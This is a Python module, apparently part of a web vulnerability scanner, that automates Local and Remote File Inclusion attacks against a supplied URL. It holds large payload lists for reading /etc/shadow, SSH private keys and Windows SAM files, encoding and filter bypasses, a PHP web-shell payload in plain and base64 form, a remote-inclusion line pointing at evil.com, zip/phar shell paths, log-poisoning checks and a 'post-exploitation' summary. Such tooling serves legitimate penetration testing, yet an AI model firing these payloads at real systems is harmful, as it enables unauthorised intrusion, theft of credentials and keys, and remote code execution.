import requests
import re
import time
import json
import base64
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from colorama import Fore, Style
from core.config import Config
from core.engine import make_request
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher

# Module information
description = "Advanced Local File Inclusion (LFI) Testing Module with comprehensive payloads and evasion techniques"
author = "LakshmikanthanK (@letchu_pkt)"
version = "2.1"


class LFITester:
    def __init__(self):
        self.config = Config()
        self.vulnerable_params = []
        self.baseline_responses = {}
        
        # Comprehensive LFI payloads organized by category
        self.lfi_payloads = {
            'linux_basic': [
                # Standard directory traversal
                '../../../../../../../../../../etc/passwd',
                '../../../../../../../../../../etc/shadow',
                '../../../../../../../../../../etc/group',
                '../../../../../../../../../../etc/hosts',
                '../../../../../../../../../../etc/fstab',
                '../../../../../../../../../../etc/crontab',
                '../../../../../../../../../../etc/profile',
                '../../../../../../../../../../etc/motd',
                '../../../../../../../../../../etc/issue',
                '../../../../../../../../../../etc/apache2/apache2.conf',
                '../../../../../../../../../../etc/nginx/nginx.conf',
                '../../../../../../../../../../etc/mysql/my.cnf',
                '../../../../../../../../../../etc/ssh/sshd_config',
                
                # Proc filesystem
                '/proc/self/environ',
                '/proc/self/cmdline',
                '/proc/self/stat',
                '/proc/self/status',
                '/proc/self/fd/0',
                '/proc/self/fd/1',
                '/proc/self/fd/2',
                '/proc/version',
                '/proc/meminfo',
                '/proc/cpuinfo',
                '/proc/net/tcp',
                '/proc/net/udp',
                
                # Log files
                '/var/log/apache2/access.log',
                '/var/log/apache2/error.log',
                '/var/log/nginx/access.log',
                '/var/log/nginx/error.log',
                '/var/log/httpd/access_log',
                '/var/log/httpd/error_log',
                '/var/log/auth.log',
                '/var/log/syslog',
                '/var/log/messages',
                '/var/log/secure',
                '/var/log/mysql/error.log',
                
                # Home directories
                '/home/user/.bash_history',
                '/home/user/.bashrc',
                '/home/user/.ssh/id_rsa',
                '/home/user/.ssh/authorized_keys',
                '/root/.bash_history',
                '/root/.bashrc',
                '/root/.ssh/id_rsa'
            ],
            
            'windows_basic': [
                # Windows system files
                '../../../../../../../../../../windows/win.ini',
                '../../../../../../../../../../windows/system.ini',
                '../../../../../../../../../../windows/system32/drivers/etc/hosts',
                '../../../../../../../../../../windows/system32/config/sam',
                '../../../../../../../../../../windows/system32/config/system',
                '../../../../../../../../../../windows/system32/config/software',
                '../../../../../../../../../../windows/repair/sam',
                '../../../../../../../../../../windows/repair/system',
                '../../../../../../../../../../boot.ini',
                
                # IIS logs
                '../../../../../../../../../../inetpub/logs/logfiles/w3svc1/ex*.log',
                '../../../../../../../../../../windows/system32/logfiles/w3svc1/ex*.log',
                
                # Application files
                '../../../../../../../../../../windows/system32/inetsrv/metabase.xml',
                '../../../../../../../../../../windows/system32/inetsrv/config/applicationhost.config'
            ],
            
            'encoding_bypass': [
                # URL encoding
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
                
                # Double URL encoding
                '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
                '..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini',
                
                # UTF-8 encoding
                '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
                '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
                
                # 16-bit Unicode encoding
                '..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd',
                '..%u005c..%u005c..%u005c..%u005c..%u005c..%u005cwindows%u005cwin.ini'
            ],
            
            'filter_bypass': [
                # Null byte bypass (for older systems)
                '../../../../../../../../../../etc/passwd%00',
                '../../../../../../../../../../etc/passwd%00.txt',
                '../../../../../../../../../../windows/win.ini%00',
                '../../../../../../../../../../windows/win.ini%00.txt',
                
                # Double slash bypass
                '....//....//....//....//....//....//....//....//....//....//etc/passwd',
                '....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini',
                
                # Mixed separator bypass
                '..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd',
                '../\\..\\../\\..\\../\\..\\../\\..\\../\\..\\../\\windows\\win.ini',
                
                # Case variation
                '../../../../../../../../../../ETC/PASSWD',
                '../../../../../../../../../../WINDOWS/WIN.INI',
                '../../../../../../../../../../Etc/Passwd',
                '../../../../../../../../../../Windows/Win.ini'
            ],
            
            'advanced_bypass': [
                # PHP filter wrappers
                'php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd',
                'php://filter/read=string.rot13/resource=../../../../../../../etc/passwd',
                'php://filter/convert.iconv.utf-8.utf-16/resource=../../../../../../../etc/passwd',
                
                # Data URI scheme
                'data://text/plain,<?php system($_GET["cmd"]); ?>',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+',
                
                # Remote file inclusion attempts
                'http://evil.com/shell.txt?',
                'https://pastebin.com/raw/malicious_code?',
                
                # Zip wrapper
                'zip://shell.jpg%23shell.php',
                'phar://shell.jpg/shell.php'
            ],
            
            'web_specific': [
                # Apache/Nginx config files
                '../../../../../../../../../../../usr/local/apache2/conf/httpd.conf',
                '../../../../../../../../../../../etc/apache2/sites-enabled/000-default',
                '../../../../../../../../../../../etc/nginx/sites-enabled/default',
                
                # Application config files
                '../../../../../../../../../../../var/www/html/.htaccess',
                '../../../../../../../../../../../var/www/html/config.php',
                '../../../../../../../../../../../var/www/html/wp-config.php',
                '../../../../../../../../../../../var/www/html/configuration.php',
                
                # Database config
                '../../../../../../../../../../../var/www/html/includes/config.inc.php',
                '../../../../../../../../../../../var/www/html/admin/config.php',
                '../../../../../../../../../../../var/www/html/sites/default/settings.php'
            ]
        }
        
        # Success patterns for different file types
        self.success_patterns = {
            'linux_passwd': [
                r'root:.*:0:0:',
                r'daemon:.*:1:1:',
                r'bin:.*:2:2:',
                r'sys:.*:3:3:',
                r'nobody:.*:65534:',
                r'[a-zA-Z0-9_-]+:[x\*!]:[\d]+:[\d]+:'
            ],
            'linux_shadow': [
                r'root:\$[1-6]\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]+:',
                r'[a-zA-Z0-9_-]+:\$[1-6]\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]+:'
            ],
            'linux_group': [
                r'root:x:0:',
                r'daemon:x:1:',
                r'[a-zA-Z0-9_-]+:x:[\d]+:'
            ],
            'windows_ini': [
                r'\[boot loader\]',
                r'\[fonts\]',
                r'\[extensions\]',
                r'\[mail\]',
                r'\[MCI\]',
                r'for 16-bit app support',
                r'\[drivers\]'
            ],
            'proc_environ': [
                r'DOCUMENT_ROOT=',
                r'SERVER_NAME=',
                r'HTTP_HOST=',
                r'PATH=',
                r'HTTP_USER_AGENT=',
                r'REQUEST_METHOD=',
                r'QUERY_STRING='
            ],
            'proc_cmdline': [
                r'/usr/sbin/',
                r'/bin/',
                r'/sbin/',
                r'--config',
                r'--daemon'
            ],
            'config_files': [
                r'<\?php',
                r'mysql_connect',
                r'password.*=',
                r'db_password',
                r'database.*host',
                r'DB_PASSWORD',
                r'define\(',
                r'\$config\['
            ],
            'log_files': [
                r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
                r'\[error\]',
                r'\[notice\]',
                r'GET\s+/',
                r'POST\s+/',
                r'HTTP/1\.[01]',
                r'\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2}'
            ],
            'ssh_files': [
                r'-----BEGIN RSA PRIVATE KEY-----',
                r'-----BEGIN OPENSSH PRIVATE KEY-----',
                r'ssh-rsa AAAA',
                r'ssh-dss AAAA',
                r'ecdsa-sha2-nistp256 AAAA'
            ]
        }
        
        # Error patterns that might indicate filtering
        self.error_patterns = [
            r'Warning.*include.*failed to open stream',
            r'Warning.*fopen.*failed to open stream',
            r'Warning.*file_get_contents.*failed to open stream',
            r'Fatal error.*require.*failed opening required',
            r'include_path.*open_basedir',
            r'Warning.*is_file.*open_basedir',
            r'file does not exist',
            r'permission denied',
            r'access denied',
            r'directory traversal'
        ]

    def get_baseline_response(self, url, params, parsed):
        """Get baseline response for comparison"""
        try:
            response = make_request(url)
            if response:
                return {
                    'content': response.text,
                    'status_code': response.status_code,
                    'length': len(response.text),
                    'hash': hashlib.md5(response.text.encode()).hexdigest()
                }
        except Exception:
            pass
        return None

    def inject_payload(self, url, params, parsed, param, payload):
        """Inject LFI payload into parameter"""
        try:
            test_params = params.copy()
            test_params[param] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            return make_request(test_url)
        except Exception:
            return None

    def detect_file_type(self, content):
        """Detect the type of file based on content patterns"""
        detected_types = []
        
        for file_type, patterns in self.success_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                    detected_types.append(file_type)
                    break
        
        return detected_types

    def analyze_response_differences(self, baseline, response):
        """Analyze differences between baseline and response"""
        if not baseline or not response:
            return {'significant_difference': False}
        
        analysis = {
            'length_difference': abs(len(response.text) - baseline['length']),
            'status_difference': response.status_code != baseline['status_code'],
            'content_similarity': SequenceMatcher(None, baseline['content'], response.text).ratio(),
            'significant_difference': False
        }
        
        # Determine if difference is significant
        if (analysis['length_difference'] > 100 or 
            analysis['status_difference'] or 
            analysis['content_similarity'] < 0.8):
            analysis['significant_difference'] = True
        
        return analysis

    def check_error_indicators(self, content):
        """Check for error messages that might indicate filtering or blocking"""
        detected_errors = []
        
        for pattern in self.error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                detected_errors.extend(matches)
        
        return detected_errors

    def test_lfi_basic(self, url, params, parsed, baseline):
        """Test basic LFI vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing basic LFI payloads...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            # Test Linux payloads
            for payload in self.lfi_payloads['linux_basic']:
                response = self.inject_payload(url, params, parsed, param, payload)
                if not response:
                    continue
                
                file_types = self.detect_file_type(response.text)
                if file_types:
                    if param not in vulnerabilities:
                        vulnerabilities[param] = []
                    
                    vulnerabilities[param].append({
                        'type': 'basic_lfi',
                        'payload': payload,
                        'detected_files': file_types,
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    })
                    
                    print(f"{Fore.GREEN}    [+] LFI found with payload: {payload[:50]}...{Style.RESET_ALL}")
                    print(f"        Detected files: {', '.join(file_types)}")
                    break
            
            # Test Windows payloads if Linux didn't work
            if param not in vulnerabilities:
                for payload in self.lfi_payloads['windows_basic']:
                    response = self.inject_payload(url, params, parsed, param, payload)
                    if not response:
                        continue
                    
                    file_types = self.detect_file_type(response.text)
                    if file_types:
                        if param not in vulnerabilities:
                            vulnerabilities[param] = []
                        
                        vulnerabilities[param].append({
                            'type': 'basic_lfi',
                            'payload': payload,
                            'detected_files': file_types,
                            'response_length': len(response.text),
                            'status_code': response.status_code
                        })
                        
                        print(f"{Fore.GREEN}    [+] LFI found with payload: {payload[:50]}...{Style.RESET_ALL}")
                        print(f"        Detected files: {', '.join(file_types)}")
                        break
        
        return vulnerabilities

    def test_lfi_encoding(self, url, params, parsed, baseline):
        """Test LFI with encoding bypasses"""
        print(f"{Fore.CYAN}[*] Testing encoding bypass techniques...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in self.lfi_payloads['encoding_bypass']:
                response = self.inject_payload(url, params, parsed, param, payload)
                if not response:
                    continue
                
                file_types = self.detect_file_type(response.text)
                if file_types:
                    if param not in vulnerabilities:
                        vulnerabilities[param] = []
                    
                    vulnerabilities[param].append({
                        'type': 'encoding_bypass',
                        'payload': payload,
                        'detected_files': file_types,
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    })
                    
                    print(f"{Fore.GREEN}    [+] Encoding bypass successful: {payload[:50]}...{Style.RESET_ALL}")
                    break
        
        return vulnerabilities

    def test_lfi_filter_bypass(self, url, params, parsed, baseline):
        """Test LFI filter bypass techniques"""
        print(f"{Fore.CYAN}[*] Testing filter bypass techniques...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in self.lfi_payloads['filter_bypass']:
                response = self.inject_payload(url, params, parsed, param, payload)
                if not response:
                    continue
                
                file_types = self.detect_file_type(response.text)
                error_indicators = self.check_error_indicators(response.text)
                
                if file_types:
                    if param not in vulnerabilities:
                        vulnerabilities[param] = []
                    
                    vulnerabilities[param].append({
                        'type': 'filter_bypass',
                        'payload': payload,
                        'detected_files': file_types,
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    })
                    
                    print(f"{Fore.GREEN}    [+] Filter bypass successful: {payload[:50]}...{Style.RESET_ALL}")
                    break
                elif error_indicators:
                    print(f"{Fore.YELLOW}    [!] Potential filtering detected: {error_indicators[0]}{Style.RESET_ALL}")
        
        return vulnerabilities

    def test_lfi_advanced(self, url, params, parsed, baseline):
        """Test advanced LFI techniques (PHP wrappers, etc.)"""
        print(f"{Fore.CYAN}[*] Testing advanced LFI techniques...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in self.lfi_payloads['advanced_bypass']:
                response = self.inject_payload(url, params, parsed, param, payload)
                if not response:
                    continue
                
                # Check for base64 encoded content (PHP filter)
                if 'php://filter/convert.base64-encode' in payload:
                    try:
                        # Attempt to decode base64 content
                        decoded_content = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        file_types = self.detect_file_type(decoded_content)
                        
                        if file_types:
                            if param not in vulnerabilities:
                                vulnerabilities[param] = []
                            
                            vulnerabilities[param].append({
                                'type': 'advanced_wrapper',
                                'payload': payload,
                                'detected_files': file_types,
                                'decoded_content': decoded_content[:500] + '...' if len(decoded_content) > 500 else decoded_content,
                                'response_length': len(response.text),
                                'status_code': response.status_code
                            })
                            
                            print(f"{Fore.GREEN}    [+] PHP wrapper bypass successful!{Style.RESET_ALL}")
                            break
                    except Exception:
                        pass
                else:
                    file_types = self.detect_file_type(response.text)
                    if file_types or 'system(' in response.text or '<?php' in response.text:
                        if param not in vulnerabilities:
                            vulnerabilities[param] = []
                        
                        vulnerabilities[param].append({
                            'type': 'advanced_wrapper',
                            'payload': payload,
                            'detected_files': file_types,
                            'response_length': len(response.text),
                            'status_code': response.status_code
                        })
                        
                        print(f"{Fore.GREEN}    [+] Advanced technique successful: {payload[:50]}...{Style.RESET_ALL}")
                        break
        
        return vulnerabilities

    def test_log_poisoning(self, url, params, parsed, baseline):
        """Test for log poisoning possibilities"""
        print(f"{Fore.CYAN}[*] Testing log poisoning attack vectors...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/auth.log',
            '/proc/self/environ'
        ]
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for log_file in log_files:
                payload = '../../../../../../../../../../' + log_file
                response = self.inject_payload(url, params, parsed, param, payload)
                
                if not response:
                    continue
                
                # Check if we can see log content
                log_indicators = ['User-Agent', 'GET /', 'POST /', 'HTTP/1.1', 'Mozilla/']
                if any(indicator in response.text for indicator in log_indicators):
                    if param not in vulnerabilities:
                        vulnerabilities[param] = []
                    
                    vulnerabilities[param].append({
                        'type': 'log_poisoning',
                        'payload': payload,
                        'log_file': log_file,
                        'response_length': len(response.text),
                        'status_code': response.status_code,
                        'note': 'Potential log poisoning vector - logs are accessible'
                    })
                    
                    print(f"{Fore.YELLOW}    [!] Log file accessible: {log_file}{Style.RESET_ALL}")
                    print(f"        This could lead to log poisoning attacks!")
        
        return vulnerabilities

    def generate_detailed_report(self, results):
        """Generate detailed vulnerability report"""
        report = {
            'target': self.config.target,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'summary': {
                'total_parameters_tested': 0,
                'vulnerable_parameters': 0,
                'vulnerability_types': set(),
                'risk_level': 'Low'
            }
        }
        
        all_vulns = []
        for test_type, params_dict in results.items():
            for param, vulns_list in params_dict.items():
                report['summary']['total_parameters_tested'] += 1
                if vulns_list:
                    report['summary']['vulnerable_parameters'] += 1
                
                for vuln in vulns_list:
                    severity = self.get_severity(vuln['type'])
                    all_vulns.append({
                        'parameter': param,
                        'type': vuln['type'],
                        'payload': vuln['payload'],
                        'details': vuln,
                        'severity': severity
                    })
                    report['summary']['vulnerability_types'].add(vuln['type'])
        
        report['vulnerabilities'] = all_vulns
        report['summary']['vulnerability_types'] = list(report['summary']['vulnerability_types'])
        
        # Determine overall risk level
        if any(v['severity'] == 'Critical' for v in all_vulns):
            report['summary']['risk_level'] = 'Critical'
        elif any(v['severity'] == 'High' for v in all_vulns):
            report['summary']['risk_level'] = 'High'
        elif any(v['severity'] == 'Medium' for v in all_vulns):
            report['summary']['risk_level'] = 'Medium'
        
        return report

    def test_rfi_possibilities(self, url, params, parsed, baseline):
        """Test for Remote File Inclusion possibilities"""
        print(f"{Fore.CYAN}[*] Testing Remote File Inclusion (RFI) vectors...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        # Safe RFI test payloads (non-malicious)
        rfi_payloads = [
            'http://www.google.com/robots.txt',
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/robots.txt',
            'ftp://ftp.example.com/test.txt',
            'data://text/plain,RFI_TEST_SUCCESS'
        ]
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in rfi_payloads:
                response = self.inject_payload(url, params, parsed, param, payload)
                if not response:
                    continue
                
                # Check for successful RFI indicators
                rfi_indicators = [
                    'User-agent:', 'Disallow:', 'Allow:', 'RFI_TEST_SUCCESS',
                    'Sitemap:', 'Crawl-delay:'
                ]
                
                if any(indicator in response.text for indicator in rfi_indicators):
                    if param not in vulnerabilities:
                        vulnerabilities[param] = []
                    
                    vulnerabilities[param].append({
                        'type': 'remote_file_inclusion',
                        'payload': payload,
                        'response_length': len(response.text),
                        'status_code': response.status_code,
                        'note': 'Remote file successfully included'
                    })
                    
                    print(f"{Fore.RED}    [+] RFI vulnerability found: {payload}{Style.RESET_ALL}")
                    break
        
        return vulnerabilities

    def test_path_truncation(self, url, params, parsed, baseline):
        """Test for path truncation vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing path truncation techniques...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        # Generate long strings for truncation
        truncation_payloads = []
        base_payload = '../' * 15 + 'etc/passwd'
        
        # Add various truncation techniques
        for i in range(1, 10):
            # Null byte truncation
            truncation_payloads.append(base_payload + '\x00' + 'A' * (4096 * i))
            # Dot truncation
            truncation_payloads.append(base_payload + '.' * (4096 * i))
            # Slash truncation
            truncation_payloads.append(base_payload + '/' * (512 * i))
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in truncation_payloads:
                try:
                    response = self.inject_payload(url, params, parsed, param, payload)
                    if not response:
                        continue
                    
                    file_types = self.detect_file_type(response.text)
                    if file_types:
                        if param not in vulnerabilities:
                            vulnerabilities[param] = []
                        
                        vulnerabilities[param].append({
                            'type': 'path_truncation',
                            'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                            'detected_files': file_types,
                            'response_length': len(response.text),
                            'status_code': response.status_code
                        })
                        
                        print(f"{Fore.GREEN}    [+] Path truncation successful{Style.RESET_ALL}")
                        break
                except Exception:
                    continue
        
        return vulnerabilities

    def test_zip_wrapper_exploitation(self, url, params, parsed, baseline):
        """Test ZIP wrapper exploitation"""
        print(f"{Fore.CYAN}[*] Testing ZIP wrapper exploitation...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        zip_payloads = [
            'zip://test.zip#test.txt',
            'phar://test.phar/test.txt',
            'zip:///var/www/html/uploads/shell.jpg#shell.php',
            'phar:///tmp/shell.jpg/shell.php'
        ]
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in zip_payloads:
                response = self.inject_payload(url, params, parsed, param, payload)
                if not response:
                    continue
                
                # Check for successful wrapper usage
                if ('<?php' in response.text or 
                    'PK' in response.text[:4] or  # ZIP magic bytes
                    'GBMB' in response.text[:4]):  # PHAR magic bytes
                    
                    if param not in vulnerabilities:
                        vulnerabilities[param] = []
                    
                    vulnerabilities[param].append({
                        'type': 'zip_wrapper',
                        'payload': payload,
                        'response_length': len(response.text),
                        'status_code': response.status_code,
                        'note': 'ZIP/PHAR wrapper exploitation possible'
                    })
                    
                    print(f"{Fore.YELLOW}    [!] ZIP wrapper response detected{Style.RESET_ALL}")
        
        return vulnerabilities

    def test_session_file_inclusion(self, url, params, parsed, baseline):
        """Test for session file inclusion vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing session file inclusion...{Style.RESET_ALL}")
        vulnerabilities = {}
        
        # Common session file locations
        session_paths = [
            '/tmp/sess_',
            '/var/lib/php/sessions/sess_',
            '/var/lib/php5/sess_',
            '/Applications/XAMPP/xamppfiles/temp/sess_',
            'C:\\WINDOWS\\Temp\\sess_',
            'C:\\xampp\\tmp\\sess_'
        ]
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            # Try to include session files with common patterns
            for base_path in session_paths:
                # Generate some common session ID patterns
                session_ids = [
                    'PHPSESSID123456789',
                    '1234567890abcdef',
                    'sess_123456789abcdef',
                    'abcdef1234567890'
                ]
                
                for sess_id in session_ids:
                    payload = '../' * 10 + base_path + sess_id
                    response = self.inject_payload(url, params, parsed, param, payload)
                    
                    if not response:
                        continue
                    
                    # Check for session file content patterns
                    session_patterns = [
                        r'[a-zA-Z_][a-zA-Z0-9_]*\|[a-zA-Z0-9:]+;',
                        r'user_id\|',
                        r'username\|',
                        r'logged_in\|',
                        r's:\d+:"'
                    ]
                    
                    for pattern in session_patterns:
                        if re.search(pattern, response.text):
                            if param not in vulnerabilities:
                                vulnerabilities[param] = []
                            
                            vulnerabilities[param].append({
                                'type': 'session_inclusion',
                                'payload': payload,
                                'session_path': base_path,
                                'response_length': len(response.text),
                                'status_code': response.status_code,
                                'note': 'Session file inclusion detected'
                            })
                            
                            print(f"{Fore.YELLOW}    [!] Session file accessible: {base_path}{Style.RESET_ALL}")
                            break
        
        return vulnerabilities

    def perform_post_exploitation_checks(self, vulnerabilities):
        """Perform post-exploitation analysis"""
        print(f"{Fore.CYAN}[*] Performing post-exploitation analysis...{Style.RESET_ALL}")
        
        exploitation_info = {
            'sensitive_files_found': [],
            'potential_escalation': [],
            'data_exposure_risk': 'Low'
        }
        
        for param, vulns in vulnerabilities.items():
            for vuln in vulns:
                detected_files = vuln.get('detected_files', [])
                
                # Analyze sensitive file access
                if 'linux_passwd' in detected_files:
                    exploitation_info['sensitive_files_found'].append('User accounts exposed')
                    exploitation_info['data_exposure_risk'] = 'High'
                
                if 'linux_shadow' in detected_files:
                    exploitation_info['sensitive_files_found'].append('Password hashes exposed')
                    exploitation_info['data_exposure_risk'] = 'Critical'
                
                if 'ssh_files' in detected_files:
                    exploitation_info['sensitive_files_found'].append('SSH private keys exposed')
                    exploitation_info['potential_escalation'].append('Remote system access')
                    exploitation_info['data_exposure_risk'] = 'Critical'
                
                if 'config_files' in detected_files:
                    exploitation_info['sensitive_files_found'].append('Configuration files exposed')
                    exploitation_info['potential_escalation'].append('Database credentials')
                    exploitation_info['data_exposure_risk'] = 'High'
                
                # Check for code execution possibilities
                if vuln['type'] == 'log_poisoning':
                    exploitation_info['potential_escalation'].append('Remote code execution via log poisoning')
                
                if vuln['type'] == 'advanced_wrapper':
                    exploitation_info['potential_escalation'].append('PHP wrapper code execution')
        
        if exploitation_info['sensitive_files_found']:
            print(f"{Fore.RED}[!] Sensitive files exposed:{Style.RESET_ALL}")
            for file_type in set(exploitation_info['sensitive_files_found']):
                print(f"    → {file_type}")
        
        if exploitation_info['potential_escalation']:
            print(f"{Fore.RED}[!] Potential escalation paths:{Style.RESET_ALL}")
            for escalation in set(exploitation_info['potential_escalation']):
                print(f"    → {escalation}")
        
        return exploitation_info

    def get_severity(self, vuln_type):
        """Determine vulnerability severity"""
        severity_map = {
            'basic_lfi': 'High',
            'encoding_bypass': 'High',
            'filter_bypass': 'High',
            'advanced_wrapper': 'Critical',
            'log_poisoning': 'Critical',
            'remote_file_inclusion': 'Critical',
            'path_truncation': 'High',
            'zip_wrapper': 'High',
            'session_inclusion': 'Medium'
        }
        return severity_map.get(vuln_type, 'Medium')

def extract_parameters(url):
    """Extract parameters from URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return params, parsed

def run(target):
    """Main execution function"""
    print(f"{Fore.CYAN}[LFI] Advanced Local File Inclusion Testing for {target}{Style.RESET_ALL}")
    
    try:
        tester = LFITester()
        tester.config.target = target
        
        # Extract parameters
        params, parsed = extract_parameters(target)
        if not params:
            print(f"{Fore.YELLOW}[-] No parameters found in URL{Style.RESET_ALL}")
            Config().add_result('lfi', 'No parameters found in URL')
            return
        
        print(f"[*] Found {len(params)} parameters to test: {list(params.keys())}")
        
        # Get baseline response
        baseline = tester.get_baseline_response(target, params, parsed)
        
        # Run comprehensive LFI tests
        results = {
            'basic': tester.test_lfi_basic(target, params, parsed, baseline),
            'encoding': tester.test_lfi_encoding(target, params, parsed, baseline),
            'filter_bypass': tester.test_lfi_filter_bypass(target, params, parsed, baseline),
            'advanced': tester.test_lfi_advanced(target, params, parsed, baseline),
            'log_poisoning': tester.test_log_poisoning(target, params, parsed, baseline),
            'rfi': tester.test_rfi_possibilities(target, params, parsed, baseline),
            'truncation': tester.test_path_truncation(target, params, parsed, baseline),
            'zip_wrapper': tester.test_zip_wrapper_exploitation(target, params, parsed, baseline),
            'session_inclusion': tester.test_session_file_inclusion(target, params, parsed, baseline)
        }
        
        # Combine all vulnerabilities for post-exploitation analysis
        all_vulnerabilities = {}
        for test_type, param_vulns in results.items():
            for param, vulns in param_vulns.items():
                if param not in all_vulnerabilities:
                    all_vulnerabilities[param] = []
                all_vulnerabilities[param].extend(vulns)
        
        # Perform post-exploitation analysis
        exploitation_info = tester.perform_post_exploitation_checks(all_vulnerabilities)
        
        # Generate comprehensive report
        report = tester.generate_detailed_report(results)
        report['exploitation_analysis'] = exploitation_info
        
        # Display results
        total_vulns = len(report['vulnerabilities'])
        if total_vulns > 0:
            print(f"\n{Fore.RED}[+] Found {total_vulns} LFI vulnerabilities!{Style.RESET_ALL}")
            print(f"[+] Risk Level: {report['summary']['risk_level']}")
            
            # Group by severity
            critical_vulns = [v for v in report['vulnerabilities'] if v['severity'] == 'Critical']
            high_vulns = [v for v in report['vulnerabilities'] if v['severity'] == 'High']
            medium_vulns = [v for v in report['vulnerabilities'] if v['severity'] == 'Medium']
            
            if critical_vulns:
                print(f"  {Fore.RED}Critical: {len(critical_vulns)} vulnerabilities{Style.RESET_ALL}")
                for vuln in critical_vulns:
                    print(f"    → {vuln['parameter']}: {vuln['type']}")
            
            if high_vulns:
                print(f"  {Fore.YELLOW}High: {len(high_vulns)} vulnerabilities{Style.RESET_ALL}")
                for vuln in high_vulns:
                    print(f"    → {vuln['parameter']}: {vuln['type']}")
            
            if medium_vulns:
                print(f"  {Fore.CYAN}Medium: {len(medium_vulns)} vulnerabilities{Style.RESET_ALL}")
            
            # Save detailed results
            Config().add_result('lfi', f"Found {total_vulns} vulnerabilities (Risk: {report['summary']['risk_level']})")
            Config().add_result('lfi_detailed', json.dumps(report, indent=2))
        else:
            print(f"{Fore.GREEN}[-] No LFI vulnerabilities found{Style.RESET_ALL}")
            Config().add_result('lfi', 'No LFI vulnerabilities found')
    
    except Exception as e:
        print(f"{Fore.RED}[-] Error during LFI testing: {e}{Style.RESET_ALL}")
        Config().add_result('lfi', f'Error during testing: {str(e)}')